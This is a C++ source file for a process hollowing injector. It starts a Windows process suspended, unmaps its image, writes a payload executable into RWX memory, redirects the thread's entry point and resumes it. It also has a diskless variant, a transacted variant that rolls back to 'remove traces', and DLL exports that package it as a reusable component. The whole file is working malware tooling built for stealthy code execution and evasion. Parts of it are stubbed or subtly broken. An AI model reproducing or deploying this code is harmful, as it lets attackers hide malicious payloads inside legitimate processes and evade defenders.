// ProcessHollowing.cpp - Process hollowing injection technique
#include <Windows.h>
#include "../../include/nt_compat.hpp"
#include <ktmw32.h>
#include <iostream>
#include <vector>
#include <string>
#include <memory>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "ktmw32.lib")

// NT declarations used directly
extern "C" {
    NTSTATUS NTAPI NtCreateSection(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
}

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* pNtReadVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);

class ProcessHollowing {
private:
    // NT function pointers
    pNtUnmapViewOfSection NtUnmapViewOfSection;
    pNtQueryInformationProcess NtQueryInformationProcess;
    pNtReadVirtualMemory NtReadVirtualMemory;
    pNtWriteVirtualMemory NtWriteVirtualMemory;
    pNtProtectVirtualMemory NtProtectVirtualMemory;
    pNtAllocateVirtualMemory NtAllocateVirtualMemory;

    PROCESS_INFORMATION m_processInfo;
    bool m_processCreated;

public:
    ProcessHollowing() : m_processCreated(false) {
        memset(&m_processInfo, 0, sizeof(m_processInfo));
        InitializeNtFunctions();
        std::cout << "[ProcessHollowing] Injector initialized" << std::endl;
    }

    ~ProcessHollowing() {
        if (m_processCreated) {
            CleanupProcess();
        }
    }

    // Main process hollowing function
    bool HollowProcess(const std::wstring& targetProcess, const std::wstring& payloadPath) {
        std::cout << "[ProcessHollowing] Starting process hollowing..." << std::endl;

        // Step 1: Create suspended process
        if (!CreateSuspendedProcess(targetProcess)) {
            std::cerr << "[-] Failed to create suspended process" << std::endl;
            return false;
        }

        // Step 2: Get process information
        PROCESS_BASIC_INFORMATION pbi;
        if (!GetProcessBasicInformation(&pbi)) {
            std::cerr << "[-] Failed to get process information" << std::endl;
            return false;
        }

        // Step 3: Read PEB to get image base
        PVOID imageBase = nullptr;
        if (!ReadImageBaseFromPEB(pbi.PebBaseAddress, &imageBase)) {
            std::cerr << "[-] Failed to read image base" << std::endl;
            return false;
        }

        // Step 4: Unmap original image
        if (!UnmapOriginalImage(imageBase)) {
            std::cerr << "[-] Failed to unmap original image" << std::endl;
            return false;
        }

        // Step 5: Load and map payload
        if (!LoadAndMapPayload(payloadPath, imageBase)) {
            std::cerr << "[-] Failed to map payload" << std::endl;
            return false;
        }

        // Step 6: Set thread context (entry point)
        if (!SetThreadEntryPoint(imageBase)) {
            std::cerr << "[-] Failed to set entry point" << std::endl;
            return false;
        }

        // Step 7: Resume thread
        if (ResumeThread(m_processInfo.hThread) == -1) {
            std::cerr << "[-] Failed to resume thread" << std::endl;
            return false;
        }

        std::cout << "[+] Process hollowing successful!" << std::endl;
        return true;
    }

    // Alternative: Dynamic process hollowing (no file on disk)
    bool HollowProcessMemory(const std::wstring& targetProcess, PVOID payloadBuffer, SIZE_T payloadSize) {
        std::cout << "[ProcessHollowing] Starting memory-based hollowing..." << std::endl;

        if (!CreateSuspendedProcess(targetProcess)) {
            return false;
        }

        PROCESS_BASIC_INFORMATION pbi;
        if (!GetProcessBasicInformation(&pbi)) {
            return false;
        }

        PVOID imageBase = nullptr;
        if (!ReadImageBaseFromPEB(pbi.PebBaseAddress, &imageBase)) {
            return false;
        }

        // Parse PE headers from memory buffer
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payloadBuffer;
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)payloadBuffer + dosHeader->e_lfanew);

        // Allocate memory in target process
        PVOID remoteBase = imageBase;
        SIZE_T imageSize = ntHeaders->OptionalHeader.SizeOfImage;

        // Try to allocate at preferred base, otherwise let system choose
        NTSTATUS status = NtAllocateVirtualMemory(
            m_processInfo.hProcess,
            &remoteBase,
            0,
            &imageSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        if (!NT_SUCCESS(status)) {
            // Try unmapping first
            NtUnmapViewOfSection(m_processInfo.hProcess, imageBase);

            remoteBase = imageBase;
            status = NtAllocateVirtualMemory(
                m_processInfo.hProcess,
                &remoteBase,
                0,
                &imageSize,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            );

            if (!NT_SUCCESS(status)) {
                return false;
            }
        }

        // Map sections
        if (!MapSectionsFromMemory(payloadBuffer, remoteBase)) {
            return false;
        }

        // Update PEB image base
        if (!UpdatePEBImageBase(pbi.PebBaseAddress, remoteBase)) {
            return false;
        }

        // Set entry point
        if (!SetThreadEntryPoint(remoteBase)) {
            return false;
        }

        ResumeThread(m_processInfo.hThread);
        return true;
    }

    // Transacted hollowing variant
    bool TransactedHollowing(const std::wstring& targetProcess, const std::wstring& payloadPath) {
        std::cout << "[ProcessHollowing] Starting transacted hollowing..." << std::endl;

        // Create transaction
        HANDLE hTransaction = ::CreateTransaction(nullptr, nullptr, 0, 0, 0, 0, nullptr);
        if (hTransaction == INVALID_HANDLE_VALUE) {
            return false;
        }

        // Create transacted file
        HANDLE hTransactedFile = CreateFileTransactedW(
            payloadPath.c_str(),
            GENERIC_WRITE | GENERIC_READ,
            0,
            nullptr,
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            nullptr,
            hTransaction,
            nullptr,
            nullptr
        );

        if (hTransactedFile == INVALID_HANDLE_VALUE) {
            CloseHandle(hTransaction);
            return false;
        }

        // Write payload to transacted file
        std::vector<BYTE> payload = ReadPayloadFile(payloadPath);
        DWORD written;
        WriteFile(hTransactedFile, payload.data(), payload.size(), &written, nullptr);

        // Create section from transacted file
        HANDLE hSection = nullptr;
        NTSTATUS status = NtCreateSection(
            &hSection,
            SECTION_ALL_ACCESS,
            nullptr,
            nullptr,
            PAGE_READONLY,
            SEC_IMAGE,
            hTransactedFile
        );

        if (!NT_SUCCESS(status)) {
            CloseHandle(hTransactedFile);
            CloseHandle(hTransaction);
            return false;
        }

        // Map section and continue with hollowing
        bool success = HollowWithSection(targetProcess, hSection);

        // Cleanup
        CloseHandle(hSection);
        CloseHandle(hTransactedFile);

        // Rollback transaction to remove traces
        ::RollbackTransaction(hTransaction);
        CloseHandle(hTransaction);

        return success;
    }

private:
    void InitializeNtFunctions() {
        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
        if (!hNtdll) return;

        NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
        NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
        NtReadVirtualMemory = (pNtReadVirtualMemory)GetProcAddress(hNtdll, "NtReadVirtualMemory");
        NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
        NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
        NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    }

    bool CreateSuspendedProcess(const std::wstring& processPath) {
        STARTUPINFOW si = { sizeof(si) };

        // Create process in suspended state
        if (!CreateProcessW(
            processPath.c_str(),
            nullptr,
            nullptr,
            nullptr,
            FALSE,
            CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
            nullptr,
            nullptr,
            &si,
            &m_processInfo)) {
            return false;
        }

        m_processCreated = true;
        std::cout << "[+] Created suspended process: PID " << m_processInfo.dwProcessId << std::endl;
        return true;
    }

    bool GetProcessBasicInformation(PROCESS_BASIC_INFORMATION* pbi) {
        ULONG returnLength;
        NTSTATUS status = NtQueryInformationProcess(
            m_processInfo.hProcess,
            ProcessBasicInformation,
            pbi,
            sizeof(PROCESS_BASIC_INFORMATION),
            &returnLength
        );

        return NT_SUCCESS(status);
    }

    bool ReadImageBaseFromPEB(PPEB pebAddress, PVOID* imageBase) {
        // Read PEB from remote process
        PEB peb;
        SIZE_T bytesRead;
        NTSTATUS status = NtReadVirtualMemory(
            m_processInfo.hProcess,
            pebAddress,
            &peb,
            sizeof(PEB),
            &bytesRead
        );

        if (!NT_SUCCESS(status)) {
            return false;
        }

        *imageBase = peb.ImageBaseAddress;
        std::cout << "[+] Original image base: 0x" << std::hex << *imageBase << std::endl;
        return true;
    }

    bool UnmapOriginalImage(PVOID imageBase) {
        NTSTATUS status = NtUnmapViewOfSection(m_processInfo.hProcess, imageBase);
        if (NT_SUCCESS(status)) {
            std::cout << "[+] Unmapped original image" << std::endl;
            return true;
        }
        return false;
    }

    bool LoadAndMapPayload(const std::wstring& payloadPath, PVOID targetBase) {
        // Read payload file
        std::vector<BYTE> payload = ReadPayloadFile(payloadPath);
        if (payload.empty()) {
            return false;
        }

        // Parse PE headers
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload.data();
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload.data() + dosHeader->e_lfanew);

        // Allocate memory in target process
        PVOID remoteBase = targetBase;
        SIZE_T imageSize = ntHeaders->OptionalHeader.SizeOfImage;

        NTSTATUS status = NtAllocateVirtualMemory(
            m_processInfo.hProcess,
            &remoteBase,
            0,
            &imageSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        if (!NT_SUCCESS(status)) {
            // Try alternative base
            remoteBase = nullptr;
            status = NtAllocateVirtualMemory(
                m_processInfo.hProcess,
                &remoteBase,
                0,
                &imageSize,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            );

            if (!NT_SUCCESS(status)) {
                return false;
            }
        }

        // Write headers
        SIZE_T written;
        status = NtWriteVirtualMemory(
            m_processInfo.hProcess,
            remoteBase,
            payload.data(),
            ntHeaders->OptionalHeader.SizeOfHeaders,
            &written
        );

        if (!NT_SUCCESS(status)) {
            return false;
        }

        // Write sections
        PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(ntHeaders);
        for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            if (sections[i].SizeOfRawData > 0) {
                PVOID sectionDest = (PBYTE)remoteBase + sections[i].VirtualAddress;
                PVOID sectionSrc = payload.data() + sections[i].PointerToRawData;

                status = NtWriteVirtualMemory(
                    m_processInfo.hProcess,
                    sectionDest,
                    sectionSrc,
                    sections[i].SizeOfRawData,
                    &written
                );

                if (!NT_SUCCESS(status)) {
                    return false;
                }
            }
        }

        // Perform base relocations if needed
        if (remoteBase != (PVOID)ntHeaders->OptionalHeader.ImageBase) {
            if (!PerformBaseRelocation(payload.data(), remoteBase, ntHeaders->OptionalHeader.ImageBase)) {
                return false;
            }
        }

        std::cout << "[+] Mapped payload to: 0x" << std::hex << remoteBase << std::endl;
        return true;
    }

    bool MapSectionsFromMemory(PVOID payloadBuffer, PVOID remoteBase) {
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payloadBuffer;
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)payloadBuffer + dosHeader->e_lfanew);

        // Write headers
        SIZE_T written;
        NTSTATUS status = NtWriteVirtualMemory(
            m_processInfo.hProcess,
            remoteBase,
            payloadBuffer,
            ntHeaders->OptionalHeader.SizeOfHeaders,
            &written
        );

        if (!NT_SUCCESS(status)) {
            return false;
        }

        // Write sections
        PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(ntHeaders);
        for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            if (sections[i].SizeOfRawData > 0) {
                PVOID sectionDest = (PBYTE)remoteBase + sections[i].VirtualAddress;
                PVOID sectionSrc = (PBYTE)payloadBuffer + sections[i].PointerToRawData;

                status = NtWriteVirtualMemory(
                    m_processInfo.hProcess,
                    sectionDest,
                    sectionSrc,
                    sections[i].SizeOfRawData,
                    &written
                );
            }
        }

        return true;
    }

    bool UpdatePEBImageBase(PPEB pebAddress, PVOID newImageBase) {
        // Update ImageBaseAddress in PEB
        SIZE_T written;
        NTSTATUS status = NtWriteVirtualMemory(
            m_processInfo.hProcess,
            &pebAddress->ImageBaseAddress,
            &newImageBase,
            sizeof(PVOID),
            &written
        );

        return NT_SUCCESS(status);
    }

    bool SetThreadEntryPoint(PVOID imageBase) {
        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_FULL;

        if (!GetThreadContext(m_processInfo.hThread, &ctx)) {
            return false;
        }

        // Read NT headers from remote process
        IMAGE_DOS_HEADER dosHeader;
        IMAGE_NT_HEADERS ntHeaders;
        SIZE_T bytesRead;

        NtReadVirtualMemory(m_processInfo.hProcess, imageBase, &dosHeader, sizeof(dosHeader), &bytesRead);
        NtReadVirtualMemory(m_processInfo.hProcess,
                          (PBYTE)imageBase + dosHeader.e_lfanew,
                          &ntHeaders, sizeof(ntHeaders), &bytesRead);

        // Set new entry point
#ifdef _WIN64
        ctx.Rcx = (DWORD64)imageBase + ntHeaders.OptionalHeader.AddressOfEntryPoint;
#else
        ctx.Eax = (DWORD)imageBase + ntHeaders.OptionalHeader.AddressOfEntryPoint;
#endif

        if (!SetThreadContext(m_processInfo.hThread, &ctx)) {
            return false;
        }

        std::cout << "[+] Set entry point to: 0x" << std::hex
                  << ((DWORD64)imageBase + ntHeaders.OptionalHeader.AddressOfEntryPoint) << std::endl;
        return true;
    }

    bool PerformBaseRelocation(PVOID localBase, PVOID remoteBase, ULONG_PTR originalBase) {
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)localBase;
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)localBase + dosHeader->e_lfanew);

        if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size == 0) {
            return true; // No relocations needed
        }

        ULONG_PTR delta = (ULONG_PTR)remoteBase - originalBase;
        PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)localBase +
            ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

        while (reloc->VirtualAddress != 0) {
            PWORD relocItem = (PWORD)(reloc + 1);
            DWORD relocCount = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

            for (DWORD i = 0; i < relocCount; i++) {
                if (relocItem[i] >> 12 == IMAGE_REL_BASED_HIGHLOW ||
                    relocItem[i] >> 12 == IMAGE_REL_BASED_DIR64) {
                    DWORD rva = reloc->VirtualAddress + (relocItem[i] & 0xFFF);
                    PVOID patchAddress = (PBYTE)remoteBase + rva;

                    ULONG_PTR value;
                    SIZE_T bytesRead;
                    NtReadVirtualMemory(m_processInfo.hProcess, patchAddress, &value, sizeof(value), &bytesRead);
                    value += delta;
                    NtWriteVirtualMemory(m_processInfo.hProcess, patchAddress, &value, sizeof(value), &bytesRead);
                }
            }

            reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)reloc + reloc->SizeOfBlock);
        }

        return true;
    }

    std::vector<BYTE> ReadPayloadFile(const std::wstring& path) {
        HANDLE hFile = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
                                   OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hFile == INVALID_HANDLE_VALUE) {
            return {};
        }

        DWORD fileSize = GetFileSize(hFile, nullptr);
        std::vector<BYTE> buffer(fileSize);

        DWORD bytesRead;
        ReadFile(hFile, buffer.data(), fileSize, &bytesRead, nullptr);
        CloseHandle(hFile);

        return buffer;
    }

    bool HollowWithSection(const std::wstring& targetProcess, HANDLE hSection) {
        // Implementation for section-based hollowing
        // This would map the section into the target process
        return false; // Placeholder
    }

    void CleanupProcess() {
        if (m_processInfo.hThread) {
            CloseHandle(m_processInfo.hThread);
        }
        if (m_processInfo.hProcess) {
            TerminateProcess(m_processInfo.hProcess, 0);
            CloseHandle(m_processInfo.hProcess);
        }
        m_processCreated = false;
    }
};

// Export functions
extern "C" {
    __declspec(dllexport) void* CreateProcessHollowing() {
        return new ProcessHollowing();
    }

    __declspec(dllexport) bool HollowProcess(void* instance, const wchar_t* target, const wchar_t* payload) {
        if (ProcessHollowing* hollowing = (ProcessHollowing*)instance) {
            return hollowing->HollowProcess(target, payload);
        }
        return false;
    }

    __declspec(dllexport) void DestroyProcessHollowing(void* instance) {
        delete (ProcessHollowing*)instance;
    }
}
